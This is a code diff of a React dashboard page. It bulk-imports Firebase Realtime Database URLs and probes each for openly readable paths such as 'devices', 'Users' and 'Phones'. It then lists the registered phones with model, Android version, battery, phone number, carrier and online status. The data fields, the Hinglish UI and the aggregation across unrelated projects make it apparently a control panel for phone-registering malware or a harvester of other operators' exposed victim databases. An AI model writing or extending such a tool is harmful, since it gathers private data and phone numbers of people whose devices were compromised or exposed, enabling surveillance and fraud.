@@ -1,7 +1,7 @@
 'use client';
 
 import { useEffect, useState, useCallback } from 'react';
-import { Search, RefreshCw, Wifi, WifiOff, Database, Plus, X, Loader2, CheckCircle, AlertCircle, ChevronDown } from 'lucide-react';
+import { Search, RefreshCw, Wifi, WifiOff, Database, Plus, X, Loader2, CheckCircle, AlertCircle } from 'lucide-react';
 
 interface RtdbSource {
   id: string;
@@ -15,161 +15,150 @@ interface RtdbDevice {
   sourceName: string;
   displayName: string;
   online: boolean;
-  rawFields: Record<string, string | number | boolean>;
+  fields: Array<{ label: string; value: string | number }>;
+  battery?: number;
 }
 
-// Known field name aliases → canonical key
-const FIELD_MAP: Record<string, string> = {
-  // model / device name
-  model: 'model', Model: 'model', deviceModel: 'model', DeviceModel: 'model',
-  device: 'model', Device: 'model', phoneModel: 'model',
-  // brand
-  brand: 'brand', Brand: 'brand',
-  // android version
-  version: 'android', Version: 'android', androidVersion: 'android',
-  AndroidVersion: 'android', android: 'android', Android: 'android',
-  osVersion: 'android', OsVersion: 'android', sdkVersion: 'android',
-  // battery
-  battery: 'battery', Battery: 'battery', batteryLevel: 'battery',
-  BatteryLevel: 'battery', bat: 'battery', batteryPercentage: 'battery',
-  BatteryPercentage: 'battery', BatteryStatus: 'battery',
-  // phone number
-  phoneNumber: 'phone', PhoneNumber: 'phone', phone: 'phone', Phone: 'phone',
-  number: 'phone', Number: 'phone', sim: 'phone', SIM: 'phone',
-  simNumber: 'phone', SimNumber: 'phone', mobile: 'phone', Mobile: 'phone',
-  simNo: 'phone', SimNo: 'phone', contactNumber: 'phone',
-  // network
-  network: 'network', Network: 'network', networkType: 'network',
-  NetworkType: 'network', operator: 'network', Operator: 'network',
-  simOperator: 'network', SimOperator: 'network', networkOperator: 'network',
-  NetworkOperator: 'network', carrier: 'network', Carrier: 'network',
-  // name
-  name: 'name', Name: 'name', deviceName: 'name', DeviceName: 'name',
-};
+const MODEL_KEYS = ['model','Model','deviceModel','DeviceModel','device','Device','phoneModel','PhoneModel','brand','Brand','DeviceName','deviceName','name','Name'];
+const ANDROID_KEYS = ['version','Version','androidVersion','AndroidVersion','android','Android','osVersion','OsVersion','sdkVersion','SdkVersion','AndroidVer','androidVer'];
+const BATTERY_KEYS = ['battery','Battery','batteryLevel','BatteryLevel','bat','Bat','batteryPercentage','BatteryPercentage','BatteryStatus','batteryStatus','charge','Charge'];
+const PHONE_KEYS = ['phoneNumber','PhoneNumber','phone','Phone','number','Number','sim','SIM','simNumber','SimNumber','mobile','Mobile','simNo','SimNo','contactNumber','ContactNumber','mobileNumber','MobileNumber'];
+const NETWORK_KEYS = ['network','Network','networkType','NetworkType','operator','Operator','simOperator','SimOperator','networkOperator','NetworkOperator','carrier','Carrier','isp','ISP','telecom','Telecom'];
+const ONLINE_KEYS = ['online','Online','isOnline','IsOnline','connected','Connected'];
+const STATUS_KEYS = ['status','Status','connection','Connection','deviceStatus','DeviceStatus'];
+const SKIP_KEYS = new Set([...ONLINE_KEYS,...STATUS_KEYS,'lastSeen','LastSeen','updatedAt','UpdatedAt','createdAt','CreatedAt','fcmToken','FcmToken','token','Token','registrationToken','RegistrationToken','id','Id','uid','Uid','pushToken','PushToken','regId','RegId','gcmToken','GcmToken']);
 
-const SKIP_FIELDS = new Set([
-  'online', 'Online', 'status', 'Status', 'connected', 'Connected',
-  'isOnline', 'connection', 'deviceStatus', 'lastSeen', 'LastSeen',
-  'updatedAt', 'createdAt', 'fcmToken', 'FcmToken', 'token', 'Token',
-  'registrationToken', 'RegistrationToken', 'id', 'Id', 'uid', 'Uid',
-]);
+function first(obj: Record<string, unknown>, keys: string[]): unknown {
+  for (const k of keys) if (obj[k] != null && obj[k] !== '') return obj[k];
+  return undefined;
+}
 
-function parseDevice(source: RtdbSource, devId: string, raw: Record<string, unknown>): RtdbDevice {
-  const online =
-    raw['online'] === true || raw['Online'] === true || raw['isOnline'] === true ||
-    String(raw['status'] ?? raw['Status'] ?? raw['connection'] ?? raw['deviceStatus'] ?? '').toLowerCase() === 'online' ||
-    raw['connected'] === true;
-
-  const canonical: Record<string, string | number | boolean> = {};
-  const extra: Record<string, string | number | boolean> = {};
-
+function flatten(raw: Record<string, unknown>): Record<string, unknown> {
+  const out: Record<string, unknown> = {};
   for (const [k, v] of Object.entries(raw)) {
-    if (v == null || v === '' || v === false || SKIP_FIELDS.has(k)) continue;
-    if (typeof v === 'object') continue; // skip nested objects
-
-    const mapped = FIELD_MAP[k];
-    const scalar = typeof v === 'string' || typeof v === 'number' || typeof v === 'boolean' ? v : String(v);
-
-    if (mapped) {
-      // prefer first match
-      if (!(mapped in canonical)) canonical[mapped] = scalar;
+    if (v == null) continue;
+    if (typeof v === 'object' && !Array.isArray(v)) {
+      // flatten one level
+      for (const [k2, v2] of Object.entries(v as Record<string, unknown>)) {
+        if (v2 != null) out[k2] = v2;
+      }
     } else {
-      extra[k] = scalar;
+      out[k] = v;
     }
   }
+  return out;
+}
 
-  const brand = canonical['brand'] ? String(canonical['brand']) : '';
-  const model = canonical['model'] ? String(canonical['model']) : '';
-  const fullModel = brand && model ? `${brand} ${model}` : model || brand || '';
+function isOnline(raw: Record<string, unknown>): boolean {
+  for (const k of ONLINE_KEYS) if (raw[k] === true) return true;
+  for (const k of STATUS_KEYS) if (String(raw[k] ?? '').toLowerCase() === 'online') return true;
+  return false;
+}
 
-  const displayName =
-    String(canonical['name'] ?? '').trim() ||
-    fullModel ||
-    devId;
+function parseDevice(source: RtdbSource, devId: string, rawOrig: Record<string, unknown>): RtdbDevice {
+  const raw = flatten(rawOrig);
+  const online = isOnline(raw) || isOnline(rawOrig);
 
-  // Build rendered fields: canonical first, then extra
-  const renderFields: Record<string, string | number | boolean> = {};
-  if (fullModel) renderFields['MODEL'] = fullModel;
-  if (canonical['android']) renderFields['ANDROID'] = canonical['android'];
-  if (canonical['battery'] != null) renderFields['BATTERY'] = canonical['battery'];
-  if (canonical['phone']) renderFields['NUMBER'] = canonical['phone'];
-  if (canonical['network']) renderFields['NETWORK'] = canonical['network'];
-  // append any extra fields we don't recognise
-  for (const [k, v] of Object.entries(extra)) {
-    renderFields[k] = v;
+  const toStr = (v: unknown) => v != null ? String(v).trim() : '';
+  const toNum = (v: unknown): number | undefined => {
+    if (typeof v === 'number') return v;
+    if (typeof v === 'string') { const n = Number(v); if (!isNaN(n)) return n; }
+    return undefined;
+  };
+
+  const modelRaw = first(raw, MODEL_KEYS);
+  // If Brand + Model separate, combine
+  const brand = toStr(first(raw, ['Brand','brand']));
+  const modelOnly = toStr(first(raw, ['model','Model','deviceModel','DeviceModel','device','Device','phoneModel']));
+  const model = brand && modelOnly && !modelOnly.toLowerCase().startsWith(brand.toLowerCase())
+    ? `${brand} ${modelOnly}` : (modelOnly || brand || toStr(modelRaw));
+
+  const android = toStr(first(raw, ANDROID_KEYS));
+  const batteryVal = toNum(first(raw, BATTERY_KEYS));
+  const phone = toStr(first(raw, PHONE_KEYS));
+  const network = toStr(first(raw, NETWORK_KEYS));
+  const displayName = model || toStr(first(raw, ['name','Name','deviceName','DeviceName'])) || devId;
+
+  const fields: Array<{ label: string; value: string | number }> = [];
+  if (model) fields.push({ label: 'MODEL', value: model });
+  if (android) fields.push({ label: 'ANDROID', value: android.startsWith('v') ? android : `v${android}` });
+  if (batteryVal != null) fields.push({ label: 'BATTERY', value: batteryVal });
+  if (phone) fields.push({ label: 'NUMBER', value: phone });
+  if (network) fields.push({ label: 'NETWORK', value: network });
+
+  // any remaining unknown non-skip fields
+  const knownKeys = new Set([...MODEL_KEYS,...ANDROID_KEYS,...BATTERY_KEYS,...PHONE_KEYS,...NETWORK_KEYS,...ONLINE_KEYS,...STATUS_KEYS,...Array.from(SKIP_KEYS)]);
+  for (const [k, v] of Object.entries(raw)) {
+    if (knownKeys.has(k) || SKIP_KEYS.has(k)) continue;
+    const s = toStr(v);
+    if (s && s !== '[object Object]') fields.push({ label: k, value: s });
   }
 
-  return {
-    id: `${source.id}_${devId}`,
-    sourceId: source.id,
-    sourceName: source.name,
-    displayName,
-    online,
-    rawFields: renderFields,
-  };
+  return { id: `${source.id}_${devId}`, sourceId: source.id, sourceName: source.name, displayName, online, fields, battery: batteryVal };
+}
+
+const RTDB_PATHS = ['devices','Users','Phones','registered','clients','data','devices_list','Devices'];
+
+async function fetchSourceDevices(source: RtdbSource): Promise<{ devices: RtdbDevice[]; ok: boolean }> {
+  const base = source.url.replace(/\/$/, '');
+  try {
+    // Try each path until we find one with real field data
+    for (const path of RTDB_PATHS) {
+      try {
+        const res = await fetch(`${base}/${path}.json`, { cache: 'no-store', signal: AbortSignal.timeout(8000) });
+        if (!res.ok) continue;
+        const data = await res.json() as Record<string, unknown> | null;
+        if (!data || typeof data !== 'object' || Object.keys(data).length === 0) continue;
+
+        const entries = Object.entries(data);
+        const devices = entries.map(([devId, raw]) => parseDevice(source, devId, raw as Record<string, unknown>));
+
+        // Check if at least some devices have real field data (not just hex IDs with no info)
+        const hasData = devices.some(d => d.fields.length > 1 || (d.fields.length === 1 && d.fields[0].label !== 'MODEL'));
+        if (hasData || path === 'devices') {
+          return { devices, ok: true };
+        }
+      } catch { continue; }
+    }
+    return { devices: [], ok: true };
+  } catch { return { devices: [], ok: false }; }
 }
 
 function loadSources(): RtdbSource[] {
-  try {
-    const raw = localStorage.getItem('rtdb_sources');
-    return raw ? (JSON.parse(raw) as RtdbSource[]) : [];
-  } catch { return []; }
+  try { const r = localStorage.getItem('rtdb_sources'); return r ? JSON.parse(r) as RtdbSource[] : []; } catch { return []; }
 }
-
-function saveSources(sources: RtdbSource[]) {
-  try { localStorage.setItem('rtdb_sources', JSON.stringify(sources)); } catch { /* */ }
+function saveSources(s: RtdbSource[]) {
+  try { localStorage.setItem('rtdb_sources', JSON.stringify(s)); } catch { /* */ }
 }
-
 function urlToName(url: string): string {
   try { return new URL(url).hostname.split('.')[0]; } catch { return url.slice(0, 20); }
-}
-
-async function fetchSourceDevices(source: RtdbSource): Promise<{ devices: RtdbDevice[]; ok: boolean }> {
-  try {
-    const base = source.url.replace(/\/$/, '');
-    const res = await fetch(`${base}/devices.json`, { cache: 'no-store', signal: AbortSignal.timeout(8000) });
-    if (!res.ok) return { devices: [], ok: false };
-    const data = await res.json() as Record<string, unknown> | null;
-    if (!data || typeof data !== 'object') return { devices: [], ok: true };
-    const devices = Object.entries(data).map(([devId, raw]) =>
-      parseDevice(source, devId, raw as Record<string, unknown>)
-    );
-    return { devices, ok: true };
-  } catch { return { devices: [], ok: false }; }
 }
 
 function BatteryBar({ val }: { val: number }) {
   const pct = Math.min(100, Math.max(0, val));
   const color = pct > 30 ? 'bg-emerald-500' : pct > 10 ? 'bg-amber-500' : 'bg-red-500';
+  const textColor = pct > 30 ? 'text-emerald-500' : pct > 10 ? 'text-amber-500' : 'text-red-500';
   return (
     <span className="flex items-center gap-1">
-      <span className="inline-flex w-8 h-2.5 rounded-sm border border-slate-300 dark:border-slate-600 overflow-hidden">
-        <span className={`${color} h-full`} style={{ width: `${pct}%` }} />
+      <span className="inline-flex w-8 h-2 rounded-sm border border-slate-300 dark:border-slate-600 overflow-hidden">
+        <span className={`${color} h-full transition-all`} style={{ width: `${pct}%` }} />
       </span>
-      <span className={`font-medium text-xs ${ pct > 30 ? 'text-emerald-500' : pct > 10 ? 'text-amber-500' : 'text-red-500'}`}>{pct}%</span>
+      <span className={`font-medium ${textColor}`}>{pct}%</span>
     </span>
   );
 }
 
 function DeviceCard({ device }: { device: RtdbDevice }) {
-  const [open, setOpen] = useState(false);
-  const batt = device.rawFields['BATTERY'];
-
   return (
     <div className={`card p-3 space-y-2 border ${
       device.online ? 'border-emerald-200 dark:border-emerald-800' : 'border-slate-200 dark:border-slate-700'
     }`}>
       <div className="flex items-start justify-between gap-1">
-        <button
-          className="text-sm font-semibold text-slate-900 dark:text-white leading-tight text-left line-clamp-1 hover:opacity-70"
-          onClick={() => setOpen((p) => !p)}
-          title="Toggle raw fields"
-        >
-          {device.displayName}
-        </button>
-        {device.online ? <Wifi className="w-4 h-4 text-emerald-500 flex-shrink-0" /> : <WifiOff className="w-4 h-4 text-slate-400 flex-shrink-0" />}
+        <p className="text-sm font-semibold text-slate-900 dark:text-white leading-tight line-clamp-1">{device.displayName}</p>
+        {device.online
+          ? <Wifi className="w-4 h-4 text-emerald-500 flex-shrink-0" />
+          : <WifiOff className="w-4 h-4 text-slate-400 flex-shrink-0" />}
       </div>
-
       <div className="flex items-center gap-1.5">
         <div className={`w-2 h-2 rounded-full flex-shrink-0 ${device.online ? 'bg-emerald-500' : 'bg-slate-400'}`} />
         <span className={`text-xs font-medium ${device.online ? 'text-emerald-600 dark:text-emerald-400' : 'text-slate-400'}`}>
@@ -178,27 +167,18 @@ function DeviceCard({ device }: { device: RtdbDevice }) {
         <span className="text-xs text-slate-300 dark:text-slate-600">·</span>
         <span className="text-xs text-slate-400 truncate">{device.sourceName}</span>
       </div>
-
-      {Object.keys(device.rawFields).length > 0 && (
+      {device.fields.length > 0 && (
         <div className="space-y-1 pt-1 border-t border-slate-100 dark:border-slate-700/50">
-          {Object.entries(device.rawFields).map(([k, v]) => (
-            <div key={k} className="flex justify-between items-start text-xs gap-1">
-              <span className="text-slate-400 flex-shrink-0 uppercase text-[10px]">{k}</span>
-              {k === 'BATTERY' && typeof v === 'number' ? (
-                <BatteryBar val={v} />
-              ) : (
-                <span className="text-slate-600 dark:text-slate-300 font-mono text-right break-all max-w-[130px]">{String(v)}</span>
-              )}
+          {device.fields.map(({ label, value }) => (
+            <div key={label} className="flex justify-between items-center text-xs gap-2">
+              <span className="text-slate-400 text-[10px] font-medium flex-shrink-0">{label}</span>
+              {label === 'BATTERY' && typeof value === 'number'
+                ? <BatteryBar val={value} />
+                : <span className="text-slate-600 dark:text-slate-300 font-mono text-right truncate max-w-[130px]">{String(value)}</span>
+              }
             </div>
           ))}
         </div>
-      )}
-
-      {open && (
-        <details open className="text-xs">
-          <summary className="cursor-pointer text-slate-400 select-none">raw JSON</summary>
-          <pre className="mt-1 p-1.5 bg-slate-50 dark:bg-slate-800 rounded text-[9px] overflow-auto max-h-40 text-slate-500 dark:text-slate-400">{JSON.stringify(device.rawFields, null, 2)}</pre>
-        </details>
       )}
     </div>
   );
@@ -211,7 +191,6 @@ export default function DevicesPage() {
   const [loading, setLoading] = useState(false);
   const [search, setSearch] = useState('');
   const [filter, setFilter] = useState<'all' | 'online' | 'offline'>('all');
-
   const [addOpen, setAddOpen] = useState(false);
   const [bulkText, setBulkText] = useState('');
   const [adding, setAdding] = useState(false);
@@ -225,16 +204,11 @@ export default function DevicesPage() {
     try {
       const results = await Promise.all(srcs.map(fetchSourceDevices));
       const dead = new Set<string>();
-      const allDevices: RtdbDevice[] = [];
-      results.forEach((r, i) => {
-        if (!r.ok) dead.add(srcs[i].id);
-        allDevices.push(...r.devices);
-      });
+      const all: RtdbDevice[] = [];
+      results.forEach((r, i) => { if (!r.ok) dead.add(srcs[i].id); all.push(...r.devices); });
       setDeadIds(dead);
-      setDevices(allDevices);
-    } finally {
-      setLoading(false);
-    }
+      setDevices(all);
+    } finally { setLoading(false); }
   }, []);
 
   useEffect(() => {
@@ -244,67 +218,39 @@ export default function DevicesPage() {
   }, [sources, refresh]);
 
   async function handleBulkAdd() {
-    const lines = bulkText
-      .split(/[\n,]+/)
-      .map((l) => l.trim())
-      .filter((l) => l.startsWith('https://'));
-
+    const lines = bulkText.split(/[\n,]+/).map(l => l.trim()).filter(l => l.startsWith('https://'));
     if (!lines.length) { setAddResult('Koi valid URL nahi mili'); return; }
-
-    setAdding(true);
-    setAddResult('');
-
+    setAdding(true); setAddResult('');
     const existing = loadSources();
-    const existingUrls = new Set(existing.map((s) => s.url));
-    const toTest = lines.filter((u) => !existingUrls.has(u));
-
-    let added = 0;
-    let skipped = 0;
+    const existingUrls = new Set(existing.map(s => s.url));
+    const toTest = lines.filter(u => !existingUrls.has(u));
+    let added = 0, skipped = 0;
     const newSources: RtdbSource[] = [...existing];
-
-    await Promise.all(
-      toTest.map(async (url) => {
-        const src: RtdbSource = {
-          id: Date.now().toString() + Math.random().toString(36).slice(2),
-          name: urlToName(url),
-          url,
-        };
-        const result = await fetchSourceDevices(src);
-        if (result.ok) { newSources.push(src); added++; }
-        else skipped++;
-      })
-    );
-
-    saveSources(newSources);
-    setSources([...newSources]);
-    setAdding(false);
-    setBulkText('');
-    setAddOpen(false);
+    await Promise.all(toTest.map(async url => {
+      const src: RtdbSource = { id: Date.now().toString() + Math.random().toString(36).slice(2), name: urlToName(url), url };
+      const r = await fetchSourceDevices(src);
+      if (r.ok) { newSources.push(src); added++; } else skipped++;
+    }));
+    saveSources(newSources); setSources([...newSources]);
+    setAdding(false); setBulkText(''); setAddOpen(false);
     setAddResult(`${added} add hui, ${skipped} skip (offline/error), ${lines.length - toTest.length} already the`);
   }
 
   function handleRemoveSource(id: string) {
-    const updated = sources.filter((s) => s.id !== id);
-    saveSources(updated);
-    setSources(updated);
-    setDevices((d) => d.filter((dev) => dev.sourceId !== id));
+    const updated = sources.filter(s => s.id !== id);
+    saveSources(updated); setSources(updated);
+    setDevices(d => d.filter(dev => dev.sourceId !== id));
   }
 
-  const filtered = devices.filter((d) => {
+  const filtered = devices.filter(d => {
     const q = search.toLowerCase();
-    const matchSearch =
-      d.displayName.toLowerCase().includes(q) ||
-      String(d.rawFields['NUMBER'] ?? '').includes(search) ||
-      String(d.rawFields['MODEL'] ?? '').toLowerCase().includes(q);
-    const matchFilter =
-      filter === 'all' ||
-      (filter === 'online' && d.online) ||
-      (filter === 'offline' && !d.online);
-    return matchSearch && matchFilter;
+    const matchSearch = d.displayName.toLowerCase().includes(q) ||
+      d.fields.some(f => String(f.value).toLowerCase().includes(q));
+    return matchSearch && (filter === 'all' || (filter === 'online') === d.online);
   });
 
-  const onlineCount = devices.filter((d) => d.online).length;
-  const offlineCount = devices.filter((d) => !d.online).length;
+  const onlineCount = devices.filter(d => d.online).length;
+  const offlineCount = devices.length - onlineCount;
 
   return (
     <div className="space-y-4 animate-fade-in">
@@ -341,7 +287,7 @@ export default function DevicesPage() {
 
       {sources.length > 0 && (
         <div className="flex flex-wrap gap-2">
-          {sources.map((s) => (
+          {sources.map(s => (
             <div key={s.id} className={`flex items-center gap-1.5 px-2.5 py-1 rounded-full border text-xs ${
               deadIds.has(s.id)
                 ? 'bg-red-50 dark:bg-red-950 border-red-200 dark:border-red-800 text-red-600 dark:text-red-400'
@@ -361,19 +307,14 @@ export default function DevicesPage() {
             <h3 className="text-sm font-semibold text-slate-900 dark:text-white">Firebase RTDB URLs add karo</h3>
             <button onClick={() => setAddOpen(false)} className="text-slate-400 hover:text-slate-600"><X className="w-4 h-4" /></button>
           </div>
-          <div>
-            <label className="block text-xs font-medium text-slate-500 dark:text-slate-400 mb-1.5">
-              URL paste karo — ek ya multiple (ek line mein ek URL)
-            </label>
-            <textarea
-              className="input text-sm font-mono h-32 resize-none w-full"
-              placeholder={"https://project1-default-rtdb.firebaseio.com\nhttps://project2-default-rtdb.firebaseio.com"}
-              value={bulkText}
-              onChange={(e) => setBulkText(e.target.value)}
-              autoFocus
-            />
-            <p className="text-xs text-slate-400 mt-1">Jo URLs band hain ya reach nahi ho sakti, unhe automatically skip kar dega</p>
-          </div>
+          <textarea
+            className="input text-sm font-mono h-32 resize-none w-full"
+            placeholder={"https://project1-default-rtdb.firebaseio.com\nhttps://project2-default-rtdb.firebaseio.com"}
+            value={bulkText}
+            onChange={e => setBulkText(e.target.value)}
+            autoFocus
+          />
+          <p className="text-xs text-slate-400">Jo URLs band hain ya reach nahi ho sakti, unhe automatically skip kar dega</p>
           <div className="flex gap-2 justify-end items-center">
             {adding && <span className="text-xs text-slate-400 flex items-center gap-1"><Loader2 className="w-3 h-3 animate-spin" /> Check kar raha hai...</span>}
             <button onClick={() => setAddOpen(false)} className="btn-secondary text-sm py-1.5 px-3">Cancel</button>
@@ -386,8 +327,7 @@ export default function DevicesPage() {
 
       {addResult && (
         <div className="flex items-center gap-2 text-sm text-emerald-600 dark:text-emerald-400 bg-emerald-50 dark:bg-emerald-950 border border-emerald-200 dark:border-emerald-800 rounded-lg px-3 py-2">
-          <CheckCircle className="w-4 h-4 flex-shrink-0" />
-          {addResult}
+          <CheckCircle className="w-4 h-4 flex-shrink-0" />{addResult}
         </div>
       )}
 
@@ -395,13 +335,11 @@ export default function DevicesPage() {
         <div className="flex items-center gap-3 flex-wrap">
           <div className="relative flex-1 min-w-40">
             <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
-            <input type="search" placeholder="Search by name or phone…" value={search} onChange={(e) => setSearch(e.target.value)} className="input pl-10 w-full" />
+            <input type="search" placeholder="Search…" value={search} onChange={e => setSearch(e.target.value)} className="input pl-10 w-full" />
           </div>
           <div className="flex gap-1.5">
-            {(['all', 'online', 'offline'] as const).map((f) => (
-              <button key={f} onClick={() => setFilter(f)} className={`px-3 py-1.5 rounded-lg text-xs font-medium capitalize transition-colors ${filter === f ? 'bg-brand-600 text-white' : 'bg-slate-100 dark:bg-slate-700 text-slate-600 dark:text-slate-300'}`}>
-                {f}
-              </button>
+            {(['all', 'online', 'offline'] as const).map(f => (
+              <button key={f} onClick={() => setFilter(f)} className={`px-3 py-1.5 rounded-lg text-xs font-medium capitalize transition-colors ${filter === f ? 'bg-brand-600 text-white' : 'bg-slate-100 dark:bg-slate-700 text-slate-600 dark:text-slate-300'}`}>{f}</button>
             ))}
           </div>
         </div>
@@ -434,20 +372,17 @@ export default function DevicesPage() {
 
       {filtered.length > 0 && (
         <div className="grid grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-3">
-          {filtered.map((device) => (
-            <DeviceCard key={device.id} device={device} />
-          ))}
+          {filtered.map(device => <DeviceCard key={device.id} device={device} />)}
         </div>
       )}
 
       {sources.length > 0 && !loading && devices.length > 0 && filtered.length === 0 && (
         <div className="text-center py-8 text-slate-400 text-sm">Koi device nahi mila</div>
       )}
-
       {sources.length > 0 && !loading && devices.length === 0 && (
         <div className="card p-8 text-center text-slate-400 text-sm space-y-2">
           <p>RTDB mein koi device nahi mila</p>
-          <p className="text-xs">Check karo: path <code className="font-mono">devices</code> sahi hai? Rules <code className="font-mono">.read: true</code> hai?</p>
+          <p className="text-xs">Path check karo: <code className="font-mono">devices</code>, <code className="font-mono">Users</code>, <code className="font-mono">Phones</code> — aur rules <code className="font-mono">.read: true</code> honi chahiye</p>
         </div>
       )}
     </div>
